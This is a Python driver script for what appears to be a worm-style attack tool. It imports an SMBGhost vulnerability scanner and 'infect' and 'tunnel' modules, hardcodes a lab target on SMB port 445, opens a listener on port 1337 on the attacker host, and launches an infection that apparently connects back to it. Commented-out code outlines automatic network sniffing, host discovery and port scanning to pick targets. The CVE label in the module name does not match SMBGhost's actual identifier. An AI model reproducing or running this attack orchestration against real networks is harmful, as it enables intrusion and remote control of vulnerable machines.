import sys
import time
import armory.SMBGhost.cve20220796scanner as cve20220796scanner
from sniff import sniff
from infect import infect
import tunnel as comm
import sqlite3


def main(ip_range):
    targets = ip_range
    targets = '192.168.56.113'
    # network = sniff()
    # for local_ip, target_ips in network.get_host_networks().items():
    #     for target_ip in network.get_alive_hosts(local_ip):
    #         target_port_details = network.get_host_port_details(target_ip)
    #         print("Scanning Host:{} for port service".format(target_ip.address))
    #         # con = sqlite3.connect("armory/record.db")
    #         # cur = con.cursor()
    #         if target_ip.address in target_port_details.keys():
    #             for running_port in target_port_details[target_ip.address]["ports"]:
    #                 #attack = network.is_vulnerable(cur,each_port)
    #                 print("Host: {} - running port:{}".format(target_ip.address, running_port))
    #                 if target_ip.address == "192.168.56.113":
    #                     #if running_port == "445":
    #                     attack = cve20220796scanner.is_vulnerable(target_ip.address)
    #                     print("start to attack")
    #                     if attack:
    running_port =445
    local_ip = "192.168.56.108"
    print("attacking port{}".format(running_port))
    listening_port = 1337
    tunnel = comm.tunnel("192.168.56.108", listening_port)
    tunnel.start()
    #infection = infect(target_ip.address,running_port, local_ip, listening_port)
    infection = infect(targets,running_port, local_ip, listening_port)
    infection.start()
    #tunnel.set_close_client_connection(target_ip.address)
    #tunnel.set_close_client_connection(targets)
                            
            # con.close()
            # print(target_port_details)


if __name__=='__main__':
    #ip_range = sys.argv[1]
    ip_range=2
    main(ip_range)